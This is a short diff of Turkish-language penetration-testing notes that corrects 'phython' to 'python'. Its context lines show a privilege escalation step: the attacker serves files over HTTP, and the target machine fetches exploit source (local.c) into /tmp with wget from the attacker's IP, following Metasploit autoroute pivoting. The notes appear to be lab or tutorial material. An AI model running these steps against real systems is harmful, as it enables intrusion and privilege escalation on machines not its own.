@@ -75,7 +75,7 @@ M> run autoroute -s 172.16.0.0/16 (172.16.0.0/16 ip'ye sahip bir interface, sız
 
 ---Yetki yükseltme saldırısı:
 
-=>(Desktop) phython -m SimpleHTTPServer 8989 (8989 portumuzda bir web server ayağa kaldırıyoruz)
+=>(Desktop) python -m SimpleHTTPServer 8989 (8989 portumuzda bir web server ayağa kaldırıyoruz)
 ---Hedef makine: 
 => cd /tmp
 => wget http://192.168.0.24:8989/local.c
